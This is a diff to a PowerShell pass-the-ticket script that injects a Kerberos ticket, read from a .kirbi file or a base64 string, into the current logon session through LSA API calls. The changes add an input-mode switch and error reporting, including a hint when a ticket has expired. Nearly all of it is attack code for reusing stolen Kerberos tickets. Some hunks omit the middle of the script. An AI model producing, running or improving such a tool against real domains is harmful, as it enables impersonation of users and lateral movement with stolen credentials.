@@ -1,12 +1,25 @@
-# IF U WANT TO PROVIDE KIRBI FILE
-#$filepath = "A:\SSD\SHARE\ticket1.kirbi"
-#$ticket = [System.IO.File]::ReadAllBytes($filepath)
 param(
+    [int]$typeofwork,
     [string]$ticketb64
 )
 # BASE64
 $ticket = New-Object System.Byte
-$ticket = [System.Convert]::FromBase64String($ticketb64)
+switch($typeofwork){
+    1{
+        #reading kirbi file
+        $ticket = [System.IO.File]::ReadAllBytes($ticketb64)
+    }
+    2{
+        #reading from b64
+        $ticket = [System.Convert]::FromBase64String($ticketb64)
+    }
+}
+if ($ticket -eq $null){
+    write-host "[-] Be Sure entering the correct mode"
+    write-host "[-] Cannot receive ticket from file or b64"
+    exit;
+}
+
 
 # ------------------- FUNCTIONS -----------------------#
 $ptt = @"
@@ -107,6 +120,10 @@ Function ConnectToLsa()
 {
 $lsahandle = New-Object System.IntPtr
 [int]$retcode = [KRB.PTT]::LsaConnectUntrusted([ref]$lsahandle)
+if ($retcode -ne 0){
+    write-host "[-] LsaConnectUntrusted Error (NTSTATUS): ", $retcode -ForegroundColor Red
+    exit;
+}
 return $lsahandle
 }
 
@@ -128,7 +145,7 @@ $importnantlsastring.MaximumLength = [uint16]($name.Length + 1)
 $importnantlsastring.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)
 $retcode = [KRB.PTT]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$importnantlsastring,[ref]$authPackage)
 if ($retcode -ne 0){
-write-host "[-] Error LsaLookupAuthPckg: ", [KRB.PTT]::LsaNtStatusToWinError($retcode)
+write-host "[-] Error LsaLookupAuthPckg (NTSTATUS): ", $retcode -ForegroundColor Red
 exit;
 }
 write-host "[?] Kerberos Package: ", $authPackage
@@ -158,7 +175,11 @@ $ntstatus = [KRB.PTT]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$inp
 if(($ProtocolStatus -ne 0) -or ($ntstatus -ne 0))
 {
     Write-Host "[!] Error in LsaCallAuthenticationPackage" -ForegroundColor Red
-    write-host $ntstatus, $ProtocolStatus
+    write-host " NTSTATUS: ", $ntstatus, " Protocol Status: ", $ProtocolStatus
+    if ($ProtocolStatus -eq -1073741517){
+        " Ticket may be out of date"
+    }
+    exit;
 }
 if($inputBuffer -ne [System.IntPtr]::Zero)
 {
